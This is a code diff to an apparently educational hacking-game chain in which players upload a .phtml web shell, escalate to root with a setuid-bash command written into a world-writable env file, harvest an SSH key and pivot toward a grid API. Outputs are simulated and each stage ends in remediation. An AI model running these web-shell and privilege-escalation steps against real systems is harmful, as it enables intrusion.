@@ -1,5 +1,9 @@
 import type { ChainDef } from "../types";
-import { match, normalize } from "../engine";
+import { match, cmd, normalize } from "../engine";
+
+const IP_ATLAS = "192.0.2.10";
+const IP_VANTAGE = "192.0.2.55";
+const IP_CONTINENTAL = "192.0.2.201";
 
 export const hardChain: ChainDef = {
   id: "hard",
@@ -41,11 +45,11 @@ export const hardChain: ChainDef = {
       city: "Fort Renner",
       state: "NE",
       coords: { x: 44, y: 27 },
-      ip: "192.0.2.10",
+      ip: IP_ATLAS,
       tagline: "Enterprise hosting & managed infrastructure",
       briefing: [
         "TARGET: Atlas Cloud Partners — hosts infrastructure for Vantage Rail Logistics",
-        "IP: 192.0.2.10",
+        `IP: ${IP_ATLAS}`,
         "",
         "No known credentials. Full external assessment: recon, foothold, privilege escalation,",
         "and see what a root shell on a managed-hosting provider actually exposes about their clients.",
@@ -69,7 +73,7 @@ export const hardChain: ChainDef = {
         "Check the web root, then look for a customer/support portal — that's usually where file uploads live.",
         "The upload endpoint only checks Content-Type, not the actual file extension. Upload a `.phtml` shell, then trigger it directly.",
         "Once you have a shell, always check `sudo -l` before you go looking for kernel exploits. Misconfigured sudo rules are far more common in the real world.",
-        "The backup script runs as root but sources an environment file from a world-writable path first. If you control that file's contents, you control what runs as root.",
+        "The backup script runs as root but sources an environment file from a world-writable path first. If you control that file's contents, you control what runs as root — try: echo '...' > /tmp/backup.env && sudo /opt/atlas/scripts/backup.sh",
         "As root, check what's sitting around in /root — hosting providers that do 'managed ops' for clients often leave client SSH keys lying around exactly there.",
       ],
       debrief: [
@@ -78,9 +82,10 @@ export const hardChain: ChainDef = {
         "fix applied: upload validation hardened, sudo rule removed, world-writable path fixed, harvested key revoked.",
       ],
       commands: [
-        {
+        cmd({
           id: "nmap",
-          match: match.startsWith("nmap -sv 192.0.2.10", "nmap -sv", "nmap 192.0.2.10", "nmap"),
+          tool: "nmap",
+          requires: [IP_ATLAS],
           help: "nmap -sV <ip>         — service/version scan",
           run: () => ({
             completesObjective: "recon",
@@ -95,10 +100,12 @@ export const hardChain: ChainDef = {
               "Nmap done: 1 IP address (1 host up) scanned in 5.14 seconds",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "find-support",
-          match: (input) => /curl/.test(normalize(input)) && /192\.0\.2\.10\/support\/?\s*$/.test(normalize(input)),
+          tool: "curl",
+          requires: ["support"],
+          forbids: ["upload"],
           help: "curl https://<ip>/support     — check the customer support portal",
           requiresObjectives: ["recon"],
           run: () => ({
@@ -115,10 +122,11 @@ export const hardChain: ChainDef = {
               "note: server-side comment in response headers — 'X-Upload-Check: content-type-only'",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "upload",
-          match: match.includesAll("curl", "support/upload"),
+          tool: "curl",
+          requires: ["support/upload"],
           help: 'curl -F "file=@shell.phtml" https://<ip>/support/upload',
           requiresFlags: ["found_upload"],
           run: () => ({
@@ -131,27 +139,24 @@ export const hardChain: ChainDef = {
               "[+] .phtml is executed by this server's PHP handler — content-type check offered no protection.",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "trigger-shell",
-          match: match.includesAll("curl", "uploads/shell.phtml"),
+          tool: "curl",
+          requires: ["uploads/shell.phtml"],
           help: "curl \"https://<ip>/uploads/shell.phtml?cmd=whoami\"",
           requiresFlags: ["shell_uploaded"],
           run: () => ({
             completesObjective: "foothold",
             tone: "success",
             setsFlags: ["have_shell"],
-            output: [
-              "HTTP/1.1 200 OK",
-              "www-data",
-              "",
-              "[+] code execution confirmed as www-data.",
-            ],
+            output: ["HTTP/1.1 200 OK", "www-data", "", "[+] code execution confirmed as www-data."],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "sudo-l",
-          match: match.exact("sudo -l"),
+          tool: "sudo",
+          requires: ["-l"],
           help: "sudo -l                — check what you can run as another user",
           requiresFlags: ["have_shell"],
           run: () => ({
@@ -165,10 +170,13 @@ export const hardChain: ChainDef = {
               "note: backup.sh sources /tmp/backup.env before running — and /tmp is world-writable.",
             ],
           }),
-        },
+        }),
         {
           id: "privesc",
-          match: match.includesAll("backup.env", "sudo", "backup.sh"),
+          match: (input) => {
+            const n = normalize(input);
+            return n.includes("backup.env") && n.includes("backup.sh");
+          },
           help: 'echo \'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\' > /tmp/backup.env && sudo /opt/atlas/scripts/backup.sh',
           requiresFlags: ["saw_sudo_rule"],
           deniedOutput: ["run `sudo -l` first — you need to know the rule exists before you can abuse it."],
@@ -185,9 +193,10 @@ export const hardChain: ChainDef = {
             ],
           }),
         },
-        {
+        cmd({
           id: "cat-key",
-          match: match.includesAll("cat", "vantage_jumpbox_key"),
+          tool: "cat",
+          requires: ["vantage_jumpbox_key"],
           help: "cat /root/vantage_jumpbox_key    — see what's sitting in root's home",
           requiresFlags: ["root_access"],
           run: () => ({
@@ -199,15 +208,16 @@ export const hardChain: ChainDef = {
               "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt...",
               "-----END OPENSSH PRIVATE KEY-----",
               "",
-              "# admin@vantage-jump (192.0.2.55) — placed here 2024-11-02 by 'atlas-ops' during",
+              `# admin@vantage-jump (${IP_VANTAGE}) — placed here 2024-11-02 by 'atlas-ops' during`,
               "# a joint maintenance window. never removed after the ticket closed.",
               "",
               "[+] SSH key for Vantage Rail Logistics' admin jumpbox recovered.",
             ],
           }),
-        },
+        }),
         {
           id: "secure",
+          tool: "secure",
           match: match.startsWith("secure system", "secure", "remediate"),
           help: "secure system         — fix the upload flaw, the sudo rule, and revoke the key",
           requiresObjectives: ["lateral-intel"],
@@ -232,11 +242,11 @@ export const hardChain: ChainDef = {
       city: "Cutler Springs",
       state: "MO",
       coords: { x: 51, y: 33 },
-      ip: "192.0.2.55",
+      ip: IP_VANTAGE,
       tagline: "Regional rail freight dispatch & scheduling",
       briefing: [
         "TARGET: Vantage Rail Logistics — internal network, reached via a harvested jumpbox key",
-        "ENTRY: 192.0.2.55 (admin jumpbox)",
+        `ENTRY: ${IP_VANTAGE} (admin jumpbox)`,
         "",
         "This is an internal pivot exercise. The jumpbox has almost nothing on it by design —",
         "your job is to enumerate what it can reach, not what it contains.",
@@ -271,9 +281,10 @@ export const hardChain: ChainDef = {
         "all discovered credentials rotated.",
       ],
       commands: [
-        {
+        cmd({
           id: "nmap",
-          match: match.startsWith("nmap -sv 192.0.2.55", "nmap -sv", "nmap 192.0.2.55", "nmap"),
+          tool: "nmap",
+          requires: [IP_VANTAGE],
           help: "nmap -sV <ip>         — service/version scan",
           run: () => ({
             completesObjective: "recon",
@@ -287,10 +298,11 @@ export const hardChain: ChainDef = {
               "note: minimal attack surface — this box is a jumpbox, not a target in itself.",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "ssh-jumpbox",
-          match: match.includesAll("ssh", "vantage_jumpbox_key"),
+          tool: "ssh",
+          requires: ["vantage_jumpbox_key"],
           help: "ssh -i vantage_jumpbox_key admin@<ip>",
           requiresObjectives: ["recon"],
           requiresFlags: ["have_vantage_key"],
@@ -307,10 +319,11 @@ export const hardChain: ChainDef = {
               "[+] shell access on the Vantage Rail Logistics admin jumpbox.",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "cat-hosts",
-          match: match.exact("cat /etc/hosts", "cat /etc/hosts"),
+          tool: "cat",
+          requires: ["/etc/hosts"],
           help: "cat /etc/hosts         — see what internal hosts this box knows about",
           requiresFlags: ["on_jumpbox"],
           run: () => ({
@@ -325,10 +338,11 @@ export const hardChain: ChainDef = {
               "[+] ops-dispatch.internal (10.20.4.15) looks like the actual dispatch/ops server.",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "ssh-internal",
-          match: match.includesAll("ssh", "ops-dispatch"),
+          tool: "ssh",
+          requires: ["ops-dispatch"],
           help: "ssh ops@ops-dispatch.internal   — pivot to the internal ops server",
           requiresFlags: ["know_ops_host"],
           deniedOutput: ["ssh: Could not resolve hostname — you don't know this host exists yet."],
@@ -344,10 +358,11 @@ export const hardChain: ChainDef = {
               "[+] shell access on ops-dispatch.internal (10.20.4.15).",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "cat-grid-conf",
-          match: match.includesAll("cat", "grid_interconnect.conf"),
+          tool: "cat",
+          requires: ["grid_interconnect.conf"],
           help: "cat /opt/vantage/integrations/grid_interconnect.conf",
           requiresFlags: ["on_ops_server"],
           run: () => ({
@@ -356,7 +371,7 @@ export const hardChain: ChainDef = {
             setsFlags: ["have_grid_cred"],
             output: [
               "# Continental Grid Interconnect — load reporting integration",
-              "endpoint = https://192.0.2.201/api/reporting",
+              `endpoint = https://${IP_CONTINENTAL}/api/reporting`,
               'client_id = "vantage-rail-reporting"',
               'client_secret = "cgi_rpt_3d91ffa02b6c"',
               "scope = load-report:write   # NOTE: should be load-report:submit-only per CGI onboarding doc",
@@ -365,9 +380,10 @@ export const hardChain: ChainDef = {
               "[!] the scope on this credential looks broader than a reporting-only integration should have.",
             ],
           }),
-        },
+        }),
         {
           id: "secure",
+          tool: "secure",
           match: match.startsWith("secure system", "secure", "remediate"),
           help: "secure system         — lock down the pivot path and rotate credentials",
           requiresObjectives: ["loot-grid-cred"],
@@ -393,11 +409,11 @@ export const hardChain: ChainDef = {
       city: "Ashford Crossing",
       state: "OH",
       coords: { x: 63, y: 27 },
-      ip: "192.0.2.201",
+      ip: IP_CONTINENTAL,
       tagline: "Regional load-balancing authority",
       briefing: [
         "TARGET: Continental Grid Interconnect — reporting API gateway",
-        "IP: 192.0.2.201",
+        `IP: ${IP_CONTINENTAL}`,
         "YOU HAVE: a valid but suspiciously over-scoped reporting credential from Vantage Rail.",
         "",
         "Confirm what that credential can actually do. Prove the finding without ever exercising it",
@@ -435,9 +451,10 @@ export const hardChain: ChainDef = {
         "server-side instead of trusting the client_id's self-reported role.",
       ],
       commands: [
-        {
+        cmd({
           id: "nmap",
-          match: match.startsWith("nmap -sv 192.0.2.201", "nmap -sv", "nmap 192.0.2.201", "nmap"),
+          tool: "nmap",
+          requires: [IP_CONTINENTAL],
           help: "nmap -sV <ip>         — service/version scan",
           run: () => ({
             completesObjective: "recon",
@@ -452,10 +469,12 @@ export const hardChain: ChainDef = {
               "for a utility-adjacent target.",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "auth-reporting",
-          match: match.includesAll("curl", "authorization", "api/reporting"),
+          tool: "curl",
+          requires: ["authorization", "api/reporting"],
+          forbids: ["setpoints"],
           help: 'curl -H "Authorization: Bearer cgi_rpt_..." https://<ip>/api/reporting/status',
           requiresObjectives: ["recon"],
           requiresFlags: ["have_grid_cred"],
@@ -470,10 +489,11 @@ export const hardChain: ChainDef = {
               "response header: Allow-Methods-Hint: see OPTIONS /api/setpoints/{region}",
             ],
           }),
-        },
-        {
+        }),
+        cmd({
           id: "confirm-scope",
-          match: match.includesAll("curl", "-x", "options", "setpoints"),
+          tool: "curl",
+          requires: ["options", "setpoints"],
           help: 'curl -X OPTIONS -H "Authorization: Bearer cgi_rpt_..." https://<ip>/api/setpoints/midwest-3',
           requiresFlags: ["api_authed"],
           deniedOutput: ["authenticate to the reporting API first."],
@@ -490,9 +510,10 @@ export const hardChain: ChainDef = {
               "    ever touching a live value.",
             ],
           }),
-        },
+        }),
         {
           id: "secure",
+          tool: "secure",
           match: match.startsWith("secure system", "secure", "remediate"),
           help: "secure system         — revoke the credential and enforce least privilege",
           requiresObjectives: ["confirm-impact"],
